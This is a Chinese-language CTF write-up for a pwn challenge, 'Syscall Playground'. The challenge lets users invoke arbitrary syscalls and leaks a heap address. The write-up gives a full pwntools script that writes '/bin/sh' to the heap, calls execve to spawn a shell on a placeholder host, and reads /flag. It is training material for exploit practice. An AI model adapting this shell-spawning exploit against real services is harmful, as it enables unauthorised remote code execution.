# Syscall Playground

## 题目简述

菜单允许申请 `0x400` 字节堆缓冲区并泄露其地址，还允许用户指定系统调用号、参数个数和最多六个参数，最终直接调用 libc 的 `syscall()`。没有 seccomp 或系统调用白名单，因此把 `/bin/sh\0` 写入已知地址后执行 `execve` 即可获得 shell。

## 解题过程

核心调用为：

```c
syscall(syscall_num,
        args[0], args[1], args[2],
        args[3], args[4], args[5]);
```

x86-64 Linux 中 `execve` 的系统调用号是 59，参数为：

```c
execve("/bin/sh", NULL, NULL);
```

先通过菜单 1 申请缓冲区。服务会打印 malloc 返回地址，把 `b"/bin/sh\x00"` 原样写入；必须显式添加 NUL，不能让 `sendline` 附加的换行成为路径一部分。随后通过菜单 3 设置：

```text
syscall = 59
argc    = 3
rdi     = binsh_address
rsi     = 0
rdx     = 0
```

完整脚本：

```python
from pwn import context, remote

context(arch="amd64", os="linux")
io = remote("HOST", PORT)


def menu(choice):
    io.sendlineafter(b"choice: ", str(choice).encode())


def prepare(data):
    menu(1)
    io.recvuntil(b"located at ")
    address = int(io.recvline().strip(), 16)
    io.sendafter(b"data: ", data)
    return address


def invoke(number, arguments):
    menu(3)
    io.sendlineafter(b"call: ", str(number).encode())
    io.sendlineafter(b"count: ", str(len(arguments)).encode())
    for index, value in enumerate(arguments):
        io.sendlineafter(
            f"argument {index}: ".encode(),
            str(value).encode(),
        )


bin_sh = prepare(b"/bin/sh\x00")
invoke(59, [bin_sh, 0, 0])

io.sendline(b"cat /flag")
io.interactive()
```

仓库没有包含 Dockerfile 引用的实际 `build/flag`，最终 flag 以当前实例 shell 中的 `/flag` 内容为准。

## 方法总结

题目已经直接提供任意系统调用能力和可控、已知地址的内存，不需要再寻找内存破坏漏洞。构造系统调用时最重要的是核对架构调用号、参数寄存器语义和 C 字符串终止符；也可用 open/read/write 三次调用直接读取文件。
